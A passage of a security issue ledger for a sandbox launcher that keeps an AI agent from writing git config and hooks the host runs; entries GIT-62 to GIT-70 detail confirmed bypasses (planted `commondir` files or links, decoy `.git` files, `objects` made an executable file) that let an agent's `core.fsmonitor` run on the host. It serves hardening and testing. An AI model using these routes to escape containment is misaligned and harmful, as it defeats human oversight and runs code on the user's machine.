- **Status: FIXED** (2026-11-10, WSL native agent, taken from the Linux agent's list). The fix direction's second way: `_gdi_follow()` takes a target named `.git` that is a directory, no link, for a git directory whatever it holds, as the scan takes one (GIT-7, GIT-48), so a decoy `.git` file or a planted `commondir` that names it first protects it instead of marking it seen; and the gitlink loop takes an embedded `.git` directory whatever it holds, no longer only where `_is_git_dir` says it is one. G154 in `tests/test-git-internals-ro-index.sh`, seen red first: a worktree's checkout under `node_modules` whose `.git` is a repository with its `HEAD` moved aside, named first by a decoy `.git` file, and then by a planted `.git/worktrees/x154/commondir` with its `objects/` moved aside, each has its `config` and `hooks` read-only; an embedded submodule's `.git` with no `HEAD` is protected. Each of the two changes undone alone is caught.
- **Was: OPEN** (2026-11-10). Found by the review of GIT-58's fix.
- **Severity: LOW.** It needs the checkout's `.git` to be a directory already, which needs one unprotected session to make it (GIT-59, GIT-60, or a state from before an upgrade). Two routes: a decoy `.git` file naming it, while its `HEAD`, `objects/` or `refs/` is moved aside and it was never protected (once protected, the `./` placeholder keeps it a git directory); or a planted `.git/worktrees/<x>/commondir` naming it, while its `objects/` or `refs/` is moved aside, which stay writable, so this reopens even a protected one. Confidence: CONFIRMED by the reviewer.
- **Location:** `sandbox.sh: _gdi_follow()`, which sets `had[$t]` whether or not it decided the target is a git directory.
- **What's wrong:** a decoy `.git` file in the scan's reach saying `gitdir: <checkout>/.git`, or a planted `.git/worktrees/<x>/commondir` naming it, marks the directory seen and only warns that it is not a git directory (one of five such warnings a mount, then a count). The `gitdir` branch then skips it, where it would protect it as the scan protects any `.git` directory whatever it holds (GIT-7, GIT-48).
- **Fix direction:** keep the paths warned about apart from `had`, or take a `*/.git` target as a git directory in `_gdi_follow`, as the scan does. The gitlink loop requires `_is_git_dir` of an embedded `.git` directory too, unlike the scan, and may want the same change.

## 29. Found while doing GAP-2's slice 7

GIT-62 and GIT-63 were found by the review of the first tests that kill slice 7's survivors, at `f3a74e1` (main), GIT-64 by the review of the second, at `83748b0`, and GIT-65 while classifying the third batch's survivors, at `26b54d7`. Each was confirmed by running it. TST-34 was found by the review of the fourth batch, at `852a887`. GIT-67 was found by the reviews of the Linux agent's own fix of GIT-62 and GIT-64, made while the WSL native agent's landed, at `f1c52c0`; those reviews broke that design too. GIT-68 was found by the final review of GIT-67's fix, at `90acaf1`, and GIT-69 and GIT-70 by the reviews of GIT-68's fix, at `6bf3a8f`, GIT-71 and GIT-72 by the review of GIT-69's fix, at `f6879f1`.

### GIT-62: a `commondir` that is a symlink switches off the protection a regular one gets
- **Status: FIXED** (2026-11-11, WSL native agent, taken from the Linux agent's list with GIT-64, which its fix direction ties it to). A `commondir` that is a symlink refuses the launch, in every git directory the protection loop handles, naming it and saying to replace it with what it leads to: git never makes one, and a read-only bind of one holds only its target. The `WARNING` that it cannot be mounted read-only in place stays for `config`, `config.worktree`, `hooks` and `gitdir`. G166 in `tests/test-git-internals-ro-scan.sh`, all seen red first: a link in a `.git` with no `config`, one in a `.git` with a `config` that leads to a `./`, and one in a linked worktree's directory; G144's worktree directory with a `commondir` link now refuses too.
- **Rewritten 2026-11-11 by GIT-67's fix:** the check is now `sandbox.sh: _git_cd_check()`, called from the protection loop and from the path for a repository under a read-only overlay, which still only named a link. Its message names the `rm` that removes the link, since a dangling one leads to nothing to replace it with.
- **Was: OPEN** (2026-11-10).
- **Severity: MEDIUM.** A link the agent plants in a repository not yet protected (one it made, or one from before the protection) keeps launches from protecting that repository while the link is there. A session that removes it and writes a config is not named after the session, and your host's git can run that config in that directory before the next launch names it (that launch protects the repository for the first time and names the keys). Planting the link is named after the session that planted it (`_git_runs()` flags a `commondir` link), and every launch warns about the link. Confidence: CONFIRMED (the reviewer and the coordinator; the reviewer ran the planted `core.fsmonitor` with git 2.56).
- **Location:** `sandbox.sh: launcher_ro_overlay()`, in the protection loop. Placeholders are made only when the config is a file, the `commondir` is absent, or it reads `./`; the refusal of a `commondir` other than `./` reads `[[ -f "$g/commondir" && ! -L "$g/commondir" ]]`, and so does the test for whether a directory under `worktrees/` is a repository's own (a `.git` is one by its name).
- **What's wrong:**
  - A `.git` holding `HEAD`, `refs/` and `commondir -> /nonexistent`, with no `config`, gets no binds and no pins, only "`commondir` is a symlink, which cannot be mounted read-only in place". An empty `.git` beside it gets `config`, `commondir` and `hooks/` made and bound.
  - A session that then removes the link and writes `objects/` and a `config` setting `core.fsmonitor` is not named by the rescan after the session, which looks only for git directories new since launch (device, inode, birth time). Your host's git runs that `core.fsmonitor` at a `git status` in that directory, before the next launch names it. GIT-48 ("a `.git` counts whatever it holds") does not hold for this one.
  - In a `.git` with a `config`, a `commondir` link naming anything is warned about, where a regular `commondir` other than `./` refuses the launch. That `.git` still gets `config` and `hooks/` bound and is pinned, but the agent can repoint the link in every session, sending git to a config and hooks elsewhere.
  - A linked worktree's directory whose `commondir` is a link that reads `./` gets only `config.worktree`, though git takes its `config` and `hooks/` as the common ones.
- **Fix direction:** take a `commondir` link as a regular `commondir` other than `./` is taken: refuse it in a repository's own git directory (a `.git`, one under `.git/modules`, one with `objects/`), naming the link, and make the placeholders a repository's own gets wherever it is not refused. The advice "Replace the link with it" does not fit a dangling link.

### GIT-63: what a commondir in another writable mount names is not looked at after the session
- **Status: FIXED** (2026-11-11, WSL native agent, the user's choice, with GIT-65). A directory in a writable mount that a `.git` file or `commondir` names while it is no git directory (`_gdi_not_git()`, for the cross-mount queue's `commondir`s and for the scan's) or is not there (`_gd_resolve()`) is recorded (`_git_watch_add()`), and `_git_after_session()` looks at each again after the mounts' rescan, wherever it lies: one the session made a git directory, or a common directory with no `HEAD`, is named in the same WARNING when its config or hooks make git run something, and one that cannot be listed as such. The WARNING now says what follows: "if the agent makes it one, your host's git reads it unprotected until the next launch; when the container exits it is checked again, and named if git would run something." Not capped on its own: every entry is named by a `.git` file or git directory the launch counts toward `SANDBOX_GIT_MAX`, and the look is inside the rescan's deadline. G169 in `tests/test-git-internals-ro-index.sh`: the WARNING; a common directory with no `HEAD` the session makes under the other mount's `node_modules`, named after it; one naming a path not there, named at launch and after the session. All seen red first; each of eight changes undone alone (the watch not recorded, by either route or at all; the rescan's look skipped, its record dropped, or a common directory with no `HEAD` passed over; the WARNING's second line; the cross-mount queue's call) is caught.
- **Was: OPEN** (2026-11-10).
- **Severity: LOW.** A WARNING at launch names it, but not what follows from it. Confidence: CONFIRMED by the reviewer.
- **Location:** `sandbox.sh: launcher_ro_overlay()`, the loop over the `_xm_t` queue (its `WARNING: … names …, which is not a git directory; nothing there is protected.`), and `_git_after_session()`, which rescans what each mount's scan reaches.
- **What's wrong:** a linked worktree's directory reached in another writable mount whose `commondir` names a directory that is no git directory gets that WARNING. If the agent makes that directory a repository with a `core.fsmonitor` during the session, the rescan says nothing, because it does not follow targets that came through the cross-mount queue. Under `node_modules` that is in the documented "not warned" list. The same happens, not documented, for a common directory with no `HEAD` (a common directory needs none) directly in the primary that a worktree's directory in another mount names; one with a `HEAD` the primary's rescan finds by content. The WARNING does not say what follows, where `_gd_resolve()`'s says "if the agent makes it, your host's git reads it unprotected until the next launch".
- **Fix direction:** have the rescan follow the `_xm_t` targets and the common directories they name, or at least say in the WARNING, as `_gd_resolve()` does, that a repository the agent makes there is read unprotected until the next launch.

### GIT-64: a `commondir` that leads, or can be made to lead, back to its own git directory switches off the protection where there is no `config`
- **Status: FIXED** (2026-11-11, WSL native agent, the user's choice, with GIT-62). `_cd_steer()` judges a regular `commondir` other than `./` before placeholders are decided: one that leads back to its own git directory (physically, however spelled) refuses the launch in any git directory, a linked worktree's too; in a repository's own git directory with no `config` (a `.git`, one under `.git/modules`, or a worktree's directory counted as its own), so does one that reaches its target through a link inside a writable mount, or names a path not there inside one. One that names another repository's git directory is not refused (G160's third case), nor one not there outside every mount, nor a worktree directory's that is not there (a stale worktree, still warned about). The hooks WARNING's `-d "$g/objects"` arm is dropped: with these refusals it fired only where the `commondir` names another repository, whose `hooks/` git takes, and said wrongly that one was missing; GAP-2 slice 7's mutants 400 and 404, which G165 killed there, sat on it and are gone with it. G165 in `tests/test-git-internals-ro-scan.sh` is now that refusal: `.`, `./.`, `.//`, `../.git` and the absolute path each refuse; with `objects/` moved aside; a worktree's directory reading `.`; through a link in the mount; to a path not there in the mount; and not refused, the three cases above, the false hooks warning gone. All seen red first; each of seven changes undone alone is caught.
- **Rewritten 2026-11-11 by GIT-67's fix:** `_cd_steer()` is gone. The reviews of the Linux agent's parallel fix found ways past this one (GIT-67), and `sandbox.sh: _git_cd_check()` now refuses any `commondir` git does not write, in any git directory: G160's third case, one not there outside every mount and a stale worktree's absolute `commondir` are refused too.
- **Was: OPEN** (2026-11-11).
- **Severity: MEDIUM.** It opens GIT-62's window with a regular file instead of a link, and it can be silent. The agent sets it up in a repository it makes. For a `.git`, the rescan after that session says nothing; for a linked worktree's directory, it names only the new checkout's `.git` file. From the next launch on, the repository's `config` is neither made nor bound, and with `objects/` moved aside no warning is printed about it. A `config` the agent then writes runs at your host's next `git status` there. A later launch refuses, but only after the program has run. Confidence: CONFIRMED (the reviewer and the coordinator, at `83748b0`, git 2.56).
- **Location:** `sandbox.sh: launcher_ro_overlay()`, in the protection loop. Placeholders are made (`gmade`) only when the `config` is a file, the `commondir` is absent, or the `commondir` reads exactly `./`. The refusal of a `commondir` other than `./` sits inside that branch.
- **What's wrong:**
  - Take a `.git` holding `HEAD`, `objects/` and `refs/`, with no `config` and no `hooks/`, whose `commondir` reads `.`. The same happens with `./.`, `.//`, `../.git` or its own absolute path. Git takes that directory as the common one: `git rev-parse --git-common-dir` prints it, and `--git-path hooks` and `--git-path config` lie in it.
  - The launch makes nothing there and refuses nothing. It binds only `commondir` and `config.worktree`. While `objects/` is there, its only warning is that the directory "has no hooks and one could not be made". With `objects/` moved aside there is no warning at all, at launch or after the session, only the READ-ONLY line for those two binds: a `.git` is the repository's own by its name, whatever it holds.
  - Nothing names the missing `config`. During the session the agent can move `objects/` back and write a `config` that sets `core.fsmonitor`, and your host's git runs it at a `git status` in that checkout (reproduced: `FSMON-RAN`). The next launch refuses, because the `commondir` is judged once the `config` is a file, but by then the program has run.
  - A linked worktree's directory under `.git/worktrees` with a `commondir` reading `.` behaves the same, and needs no `objects/`. Without one, the launch prints no warning about it (the reviewer's run: `FSMON-wtB` on the host). A session that makes such a worktree has its checkout's `.git` file named by the rescan after it, as one that can send git elsewhere, not as an unprotected git directory, unless the checkout lies where the rescan does not look (the reviewer's run: `FSMON-wt9`).
  - For a `.git`, the session that sets it up (`git init`, remove `config` and `hooks/`, write `.` into `commondir`) draws nothing from the rescan after it.
  - The `commondir` need not lead back at launch. In such a `.git`, one that names a path through a link the agent can repoint, or a path that is not there yet, gets a warning ("… which the agent can repoint", "… which does not exist; if the agent makes it …"). A link the agent then points back at the `.git`, and a `config` it writes, run on the host the same way (the reviewer's runs: `FSMON-subL`, `FSMON-subN`).
  - Where a `commondir` names another repository's git directory directly, the same arm of the hooks warning (`-d "$g/objects"`) is false. Git takes `hooks/` from that repository, which this launch protects or which the agent cannot reach, and the launch never tried to make one. The GIT-48 fix said the warning "fires only where the launch tried to make it".
- **Fix direction:**
  - Take a repository's own git directory with no `config`: a `.git`, one under `.git/modules`, or one under `worktrees/` whose `commondir` leads back to it, `objects/` or not. Where a `commondir` other than `./` leads back to the directory, or reaches its target through a link or a path the agent can change, either refuse the launch or make and bind `config` and `hooks/` there.
  - Keep G160's third case working: a plain `commondir` naming another repository's git directory, in a `.git` with no `config`, is not refused.
  - GIT-62's fix direction (take a link as a regular `commondir` other than `./` is taken) assumes a regular one is refused, which holds only where there is a `config`. Fix the two together.
  - Then check whether the `-d "$g/objects"` arm of the hooks warning still fires anywhere it is true. If it does not, drop it.
  - Slice 7's mutants 400 and 404 sit on that arm. G165 kills them by checking that the warning names such a directory while `objects/` is there. The fix turns G165 into a check for the refusal or the binds.

### GIT-65: a common directory in a writable mount, past its scan, that an outside linked worktree names is neither protected nor named
- **Status: FIXED** (2026-11-11, WSL native agent, the user's choice, with GIT-63). Where the scan records a git directory outside every writable mount that git uses for a checkout in one (`_gref_add`: what a `.git` file or link names, and the repository a mount lies in, through a `.git` directory or link), `_gdi_out_cd()` follows its `commondir` as the scan follows one it finds (`_gdi_follow()`): a common directory in this mount is protected here, one in another writable mount in that mount's view (the cross-mount queue), one not there or reached through a link in the mount is named, and one that is no git directory is named and checked again after the session (GIT-63). One outside every mount is still judged by the GIT-44 loop, whose condition is unchanged. A repository the session makes at a path not there is named after it: the mount's rescan now follows the same `commondir`, and the path is checked again (GIT-63). G168 in `tests/test-git-internals-ro-index.sh`: the review's layout, protected (`config` and `hooks` read-only); a path not there, named, and a repository the session makes there, named after it; the repository a mount lies in, through a `.git` directory and through a `.git` link, whose `commondir` names a repository under the mount's `node_modules`, protected. All seen red first; each of five changes undone alone (each of the three call sites, the follow, the `./` filter) is caught. Slice 7's mutant 498, the GAP tied to this entry, is not killed by G168 in the three forms tried: it now decides only whether a common directory the scan protects is also judged as one outside every mount (feature-gaps review, slice 7).
- **Was: OPEN** (2026-11-11).
- **Severity: LOW.** It is silent, and the host's git runs what the agent writes there. But it needs a layout git never makes on its own: a linked worktree's git directory outside every writable mount, whose `commondir` names a common directory inside one. `git worktree add` puts that directory inside the common directory, so it is hand-made, and the agent cannot make it (the worktree's directory lies outside every mount). No route through git was found: a `worktrees/` that is a link is refused by git ("gitfile does not point to a valid repository"), and `git worktree move` and `worktree.useRelativePaths` keep the `commondir` at `../..` (the reviewer's runs). Confidence: CONFIRMED (the coordinator and the reviewer, at `26b54d7`, git 2.56).
- **Location:** `sandbox.sh: launcher_ro_overlay()`, the GIT-44 loop over the git directories outside every writable mount that git uses for a mounted checkout (`_gref_t`: what a `.git` file or link names, and the repository a mount lies in). A `commondir` there is followed only to a common directory outside every writable mount: `[[ -z "${pgk[$ocd]:-}" ]] && ! _in_writable "$ocd" && _is_common_dir "$ocd"`. One inside a writable mount is left to that mount's scan.
- **What's wrong:**
  - Take a writable mount `w` holding a checkout `w/co` and, under `w/node_modules/c`, a repository. `w/co/.git` names a linked worktree's directory outside every mount, whose `commondir` names `w/node_modules/c/.git`. `git -C w/co rev-parse --git-common-dir` prints `w/node_modules/c/.git`, so git takes that `config` and `hooks/` for the checkout.
  - The scan prunes `node_modules`, and the `commondir` is followed only to a common directory outside every writable mount. So `w/node_modules/c/.git` gets no binds and no pins, and nothing names it. The launch prints only the READ-ONLY line for `w/co/.git`. The agent can write `core.fsmonitor` into that `config`, and your host's git runs it at the next `git status` in `w/co` (reproduced: `FSMON-RAN`).
  - The rescan after the session says nothing either: that git directory existed at launch.
  - The same holds where the `commondir` names a directory in the mount that does not exist yet. Git fails there until the agent makes a repository at that path. The launch names nothing, and neither does the rescan after a session that makes one there, since it does not look under `node_modules` (the reviewer's run: `FSMON-RAN` on the host).
  - With the same common directory where the scan reaches it (`w/c`), it is protected.
- **Fix direction:** in that loop, take a `commondir` that leads into a writable mount as one found there: protect it in that mount's view, as the `_xm_t` targets are protected, and name one that does not exist or that the agent can repoint, as `_gd_resolve()` names one. AGENTS.md, under git internals, says "a linked worktree's `commondir` [is] followed … so a git directory under a pruned `node_modules` or past the depth limit is protected too"; that then holds for this case too.
- Slice 7's mutant 498 sits on that condition. It is a GAP tied to this entry: the original's silence is the bug, so no check of today's output can kill it.

### TST-34: the `grep -q` pipeline lint does not scan the git-internals tests, which take `pipefail` from their library
- **Status: FIXED** (2026-11-11, WSL native agent, the user's choice). `tests/test-grep-q-pipelines.sh` takes a file that sources a library setting `pipefail` as one that sets it (matched by basename, as the other direction is, over-including if anything). Run so before the rewrite, it named the 12 left in the four files (13 less the one the fourth batch rewrote): ten in the guard shape `! mounts | grep -qF …` and two `grep -A1 … | grep -qF` in the reports test. All are now `grep -q … < <(…)`, and the four files pass as before. A pipeline planted back in one of them is named; with either new arm of the lint undone alone, it is not.
- **Was: OPEN** (2026-11-11).
- **Severity: LOW** (test only). No check passes falsely today. Confidence: CONFIRMED by reading the lint and the files, at `852a887`.
- **Location:** `tests/test-grep-q-pipelines.sh`, which scans a file that sets `pipefail` or that one setting it sources; `tests/lib-git-internals-ro.sh`, which sets it for the files that source it, four of which do not set it themselves: `tests/test-git-internals-ro-scan.sh`, `tests/test-git-internals-ro-index.sh`, `tests/test-git-internals-ro-config.sh` and `tests/test-git-internals-ro-reports.sh`.
- **What's wrong:**
  - A file that takes `pipefail` from a library it sources is not scanned, so 13 `… | grep -q` pipelines in those files go unchecked.
  - Ten of them are `! mounts | grep -qF …` or `! git_mounts | grep -qE …`, the shape that passes falsely: if `grep -q` exits on a match while the writer is still writing, the writer dies of SIGPIPE, `pipefail` fails the pipeline, and `!` turns that into a pass for "not mounted".
  - None does today: each writer prints a few lines in one write, before `grep` exits. More output would change that without a sound.
- **Fix direction:** take a file that sources a library setting `pipefail` as one that sets it, and rewrite the 13 as `grep -q … < <(…)`, the form the lint prescribes.
- The fourth batch rewrote the one it added.

### GIT-66: on a host whose `timeout` is uutils', a bounded read of a path that is not UTF-8 reads nothing
- **Status: FIXED** (2026-11-11, WSL native agent). Found running the hermetic suite on Ubuntu 26.04, where G164 (GAP-2 slice 7) failed on `main` and on every branch.
- **Severity: MEDIUM** where it applies: a host whose `timeout` is uutils' (Ubuntu 26.04 makes uutils coreutils the default; `timeout (uutils coreutils) 0.10.0` here). The agent names the directories, so a read it makes come back empty is the agent's to choose. Confidence: CONFIRMED: `timeout -k 2 1 head -c 4097 -- <dir with byte 0xff>/commondir` prints `error: invalid UTF-8 was detected in one or more arguments` and exits 125, while `head` alone, and GNU's `gnutimeout`, read the file.
- **Location:** `sandbox.sh: _timeout_prefix()`, which every bounded read is built on (`_rd_run()`, `_rd()`, `_git_ptr_read()`, the index reads), and `_rd_run()`, which returned the bound's own failure as the command's status.
- **What happened:** uutils' `timeout` refuses an argument that is not valid UTF-8 and runs nothing. `_git_ptr_read()` takes the output of a read in a process substitution, whose status it cannot see, so the read was an empty value, not a failure: G164's bare repository under `bad\xff` had its `./` placeholder read as `''` and the launch refused with "`commondir` sends git to ''". The same empty value elsewhere is a pointer not followed.
- **Fix:** `_timeout_prefix()` takes the first of `gtimeout`, `timeout` and `gnutimeout` (GNU's, which Ubuntu ships beside uutils') that runs a command given an argument holding byte 0xff, asked once per `PATH`; with none, nothing bounds the read, as on a Mac without Homebrew's coreutils. `_rd_run()` refuses the launch when the bound exits 125 itself ("the command that bounds the read ran nothing"). G167 in `tests/test-git-internals-ro-index.sh`, with a fake that refuses as uutils' does, so it runs where `timeout` is GNU's, all seen red first: a refusing `timeout` gives way to `gnutimeout`; alone, it gives no bound; G164's layout under it launches; a bound that exits 125 refuses. G75's fake `gtimeout` now skips its options as the real one does, so the probe can run it, and the fakes of G128 (`tests/test-git-internals-ro-reads.sh`), T69 and T70 (`tests/test-launcher-dir-ro.sh`), which log the bound each read gets, do not log the probe. Each of three changes undone alone is caught; G164 passes on this host.

### GIT-67: after GIT-62's and GIT-64's fix, a planted `commondir` can still steer your host's git to a config the agent writes
- **Status: FIXED** (2026-11-11, Linux agent, the user's choice of design). `sandbox.sh: _git_cd_check()`, called from the protection loop and from the path for a repository under a read-only overlay, refuses before anything is made a `commondir` git does not write, in any git directory, a `config` beside it or not:
  - git writes one only in a linked worktree's directory (`worktrees/<name>`), as `../..`, and libgit2 as that directory's full path, with or without a trailing `/`. `../..` steps out of two directories the launch pins, and a full path holds no link or `..` to swap.
  - What it names must be a repository's own git directory: one holding `objects/` and `refs/`, which a `commondir` is followed to wherever it lies, with no `commondir` but `./`, so the launch makes and binds its config and hooks.
  - A directory with no `commondir`, or our `./`, is a repository's own, and gets its placeholders.
  - A link refuses the launch in any git directory, and one that is no regular file is refused unread.
  - Nothing git makes is refused, launched twice by the reviewer: `git worktree` with and without relative paths and after `worktree move`, worktree ids with a suffix, absorbed submodules and their worktrees, a submodule added in a linked worktree, `--separate-git-dir` and its worktrees, `absorbgitdirs`, a bare repository's worktrees, git-new-workdir, a worktree under `node_modules`; and libgit2's full path, written by hand.
  - Refused now, though it launched before: a `.git` with no `config` whose `commondir` names another repository (G160's third case), one not there outside every mount, and a linked worktree's `commondir` naming anything but its repository, a libgit2 one whose repository has moved included.
- **Was: OPEN** (2026-11-11). Found by three reviews of the Linux agent's own fix of GIT-62 and GIT-64, built in parallel with the WSL native agent's; each review's finding applied to the design main has.
- **Severity: MEDIUM.** The agent plants the layout in one session and fills in the config in a later one. The planting session drew at most the rescan's warning about a new `.git` file, and several layouts drew nothing at the next launch. The host's git then ran the agent's `core.fsmonitor` at a `git status`. Confidence: CONFIRMED: the ways were run by the reviewer with git 2.56 to `FSMON-RAN` against the rounds of the parallel fix, which shared main's design, and each is a hermetic check that main's `sandbox.sh` at `daaffcd` launches (the overlay's were not run to `FSMON-RAN`).
- **Location:** `_cd_steer()` and the protection loop of `launcher_ro_overlay()`, which followed a `commondir` other than `./` wherever it was not refused; and that function's path for a repository under a read-only overlay, which only named a link.
- **What was wrong:** in a git directory with no `config`, or in any linked worktree's directory, a `commondir` that steps through or names what the agent controls:
  - a chain: it names a directory with `objects/` and a `commondir` of its own, whose `config` git reads and nothing made or bound;
  - a directory that is no repository at launch, which the agent fills with `objects/`, `refs/` and a `config` (no `HEAD`, so the rescan does not take it for one);
  - a link that `..` cancels (`L/../../x`), which the agent repoints later;
  - a spelling git resolves apart from the kernel (`HEAD/../../..`: git reads `..` after a regular file lexically);
  - a step through a plain directory the agent swaps for a link later (`sub/../../..`);
  - a dormant target the launch already saw, which the rescan never names;
  - a worktree's directory nested in another's (`../..` naming one that holds `objects/` but has a `commondir` of its own);
  - under a read-only overlay, a `commondir` link, an empty one and an unresolved one, only named.
- **Tests:**
  - G165 in `tests/test-git-internals-ro-scan.sh`, with G160's third case.
  - G166, for links.
  - In `tests/test-git-internals-ro-casefold.sh`, a separate git directory naming itself in another case.
  - G116 in `tests/test-git-internals-ro-reads.sh`, for the overlay (a FIFO `commondir` too).
  - Each was seen failing before the fix, and each of seven changes to `_git_cd_check()` undone alone is caught.
  - These built `commondir` values git does not write, and now build git's own or check the refusal: G45, G47, G50, G154 and G162 in `tests/test-git-internals-ro-index.sh`; G111 and G116 in `tests/test-git-internals-ro-reads.sh`.
  - Three of main's checks expected a launch the allowlist refuses: the stale worktree, the path not there outside every mount, and the hooks warning beside another repository's `commondir`. They are gone.
  - G169 (GIT-63's rescan), whose worktree's directory in a writable mount named no repository, now plants that worktree's directory outside every mount, which the allowlist leaves alone as the agent cannot change it, and checks the refusal in the mount.

### GIT-68: a common directory a git directory outside every mount names is taken without being a repository's own
- **Status: FIXED** (2026-11-11, Linux agent). `sandbox.sh: _gdi_follow()`, called by `_gdi_out_cd()` with a fifth argument, refuses the launch where a git directory such a `commondir` leads to in a writable mount, this one or another, has a `commondir` other than `./` (`_cd_own()`, which `_git_cd_check()`'s rule for a worktree's grandparent now shares): git takes it as the common directory whatever its own `commondir` says, and the protection loop makes and binds a `config` and `hooks/` only where there is none but `./`. A link, a FIFO and any other value are refused with it. The refusal names the planted `commondir` to remove, or the outside one to point at the repository's own git directory. One that is no git directory, or not there, is named and looked at again after the session, as before (GIT-63, GIT-65); what was a git directory to git but not to the launcher is GIT-69, fixed since.
- **Was: OPEN** (2026-11-11).
- **Severity: LOW.** Only a directory outside every mount, which the agent cannot write, can name such a path: git writes `../..`, which stays outside. It is the premise of GIT-65's fix, that git never makes that layout. Confidence: CONFIRMED by the reviewer with git 2.56, at the GIT-67 tree on `90acaf1`: a launch with rc 0, `v/commondir` alone bound, and the host's `git status` in the checkout ran the agent's `core.fsmonitor` after the session wrote `v/config`.
- **Location:** `sandbox.sh: _gdi_out_cd()`, which follows the `commondir` of a git directory outside every mount into the mount (GIT-65), and `_git_cd_check()`, whose rule that the directory a `commondir` names be a repository's own (objects/ and refs/, no `commondir` but `./`) is applied to a worktree's grandparent only.
- **What's wrong:** an outside worktree's `commondir` names `node_modules/x/.git/worktrees/v` in the mount, where `v` holds `objects/`, `refs/` and a `commondir` of `../..`. `v` passes as a linked worktree's directory, so its `config` is neither made nor bound. git takes it as the outside worktree's common directory, and reads the `config` the agent writes there.
- **Fix direction:** require of a target `_gdi_out_cd()` queues what `_git_cd_check()` requires of a worktree's grandparent: that it be a repository's own git directory, or refuse the launch.
- **Tests:** G171 in `tests/test-git-internals-ro-index.sh`: the layout above is refused, seen failing before the fix (rc 0, the `config` not bound), and so are the same target under another writable mount and the repository a mount lies in naming it; one naming a repository's own git directory under the same `node_modules` launches, its `config` bound. Each of seven changes to the fix undone alone is caught: the fifth argument not passed, the check applied to every follow, the check confined to the mount being scanned, its condition turned, the refusal's `exit 1` made `exit 0`, and in `_cd_own()` the test for no `commondir` turned and the `./` comparison turned. G172 in `tests/test-git-internals-ro-scan.sh`: the refusal over a worktree's `../..` names the repository's own `commondir` where that is what is wrong (the repository outside every mount, its `commondir` a link), and the planted worktree's, never git's `../..`, where the repository is a real linked worktree's directory in a writable mount; each seen failing before.

### GIT-69: a directory git takes as a git directory, with `objects` or `refs` a file, is none to the launcher
- **Status: FIXED** (2026-11-12, Linux agent). `sandbox.sh: _git_has_store()` takes `objects` and `refs` whatever is there, a link included, more than git takes (`access(X_OK)`), and `_is_git_dir()` and `_is_common_dir()` use it. The scan's test for a submodule's git directory with no `HEAD` takes it beside the one-directory test it had: `git gc` writes `info/refs`, a file, in every git directory, so `objects` or `refs` alone, whatever they are, took `info/` for one (the review of the fix). A directory a `commondir` named, watched after the session, is read both ways: as git reads it for the checkout that `commondir` serves, its own `config` (`_git_watch_add()` records what named it, and `_git_runs()` takes a fourth argument), and as before, since a `.git` file may name it too. The cost is the one the fix direction names: placeholders are made in any directory that holds `HEAD`, `objects` and `refs`.
- **Was: OPEN** (2026-11-11). Found by the reviews of GIT-68's fix.
- **Severity: HIGH.** Nothing outside the mounts is needed: the agent plants a repository in a writable mount, nothing is bound and nothing is named, at that launch, after the session or at the next launch, and the host's git runs the `config` the agent writes, as in GIT-33. Confidence: CONFIRMED by the reviewers with git 2.56, to `FSMON-RAN` and to the agent's `core.pager` under a terminal; the tree before GIT-68's fix behaves the same.
- **Location:** `sandbox.sh: _is_common_dir()` (`-d objects && -d refs`) and `_is_git_dir()`, which the scan, `_gdi_follow()` and the check after the session (`_git_after_session()`) use to decide what is a git directory. Two texts it makes false: the comment at the walk up from a mount that `_is_git_dir` "takes more than git does, so it never passes over one git would use", and AGENTS.md's "matches git directories by **content**, as git does".
- **What's wrong:** git's `is_git_directory()` asks `access(…, X_OK)` of `objects` and `refs`, whatever they are, so an executable regular file passes for either; a reftable repository with `refs` replaced by one keeps working fully (status, log, commit). The launcher wants directories:
  - **A bare repository in a writable mount.** `src/` holds `HEAD`, `refs/`, `objects` as an executable file and a `config`: the launch exits 0 naming nothing, `src/config` is not bound, and `git -C src` on the host takes `src` for a bare repository and runs its `config` (the same directory with `objects/` a directory gets its `config` bound). Made during a session, it is named by nothing after it.
  - **A separate git directory.** `co/.git` holds `gitdir: ../gd`, and `gd/objects` is an executable file: the launch only says `gd` "is not a git directory; nothing there is protected", `gd/config` is not bound, and the host's `git status` in `co` runs its `core.fsmonitor`. Nothing is named after the session.
  - **A common directory named from outside the mounts** (GIT-68's layout, G171), with `v/objects` an executable file: only named, `v/config` neither made nor bound; made during a session at a path the launch named as not there, nothing is named after it (the watch needs `_is_common_dir` or `_is_git_dir`).
  - The check after the session reads, for a watched directory with a `commondir` of its own, the `config` of the directory that `commondir` names (`_git_runs()`), not its own, which is what git reads when an outside `commondir` names it. A target made worktree-shaped during a session is refused at the next launch (GIT-68), but after the session only "could not all be searched" is said, since that mount's scan exits at the refusal.
  - `_is_common_dir()` does not take the `./` placeholder as `_is_git_dir()` does (GIT-7): a protected common directory whose `refs` a session replaced with a file, and whose `HEAD` it removed, is only named at the next launch, its `config` not bound (the check after that session did name it, through the placeholder).
- **Fix direction:** mirror git for `objects` and `refs`: anything that exists, a link included, in both predicates. (A regular `commondir` alone was considered for `_is_common_dir()` too and left out: with `objects` and `refs` taken whatever they are, the case above needs both moved aside, and git then takes the directory for none either; it would also have let a worktree's `../..` name a `.git` with neither, which GIT-67 refuses, G165.) That protects more, at a cost: placeholders, a `config` and `hooks/` are then made in any directory that holds entries named `HEAD`, `objects` and `refs`, justified since the agent can make either executable later. Read a watched directory's own `config` when an outside `commondir` named it.
- **Tests:** G173 in `tests/test-git-internals-ro-scan.sh`: a bare repository in a writable mount with `objects` or `refs` an executable file is protected, and so is one with `objects` a dangling link and `refs` a file that is not executable, which git passes over; a separate git directory with `objects` an executable file is protected and not called no git directory; a submodule's git directory with no `HEAD` and both files is protected; one a session makes is named after it. G144 there: the `info/` that `git gc` writes `refs` in is no git directory. G171 in `tests/test-git-internals-ro-index.sh`: GIT-68's layout with `objects` an executable file is refused, and a worktree's directory a session makes where an outside `commondir` points is named after it, by its own `config`; G174: one a `.git` file names too is read both ways. Each was seen failing before the fix, or against the regression the review found, and each of seven changes to the fix undone alone is caught: `_git_has_store()` wanting directories, without its `-L`, or asking `-x`; the submodule test taking `objects` or `refs` alone; the watch not recording a `commondir`, or reading one way only; and `_git_runs()` ignoring its fourth argument.


### GIT-70: a refusal's remedy can name git's own `commondir`, and following it hands git the agent's config
- **Status: OPEN** (2026-11-12). Found by the final review of GIT-68's fix, at `6bf3a8f` with that fix applied; pre-existing apart from GIT-68's own message.
- **Severity: MEDIUM.** The agent shapes the layout in one session; the next launch is refused, correctly, but its remedy tells you to remove a file git wrote. Following it, the launch after exits 0, protecting the planted directory with the agent's config already in it (named once, in a NOTE), and the host's `git status` runs it. Confidence: CONFIRMED by the reviewer with git 2.56, to `FSMON-RAN`.
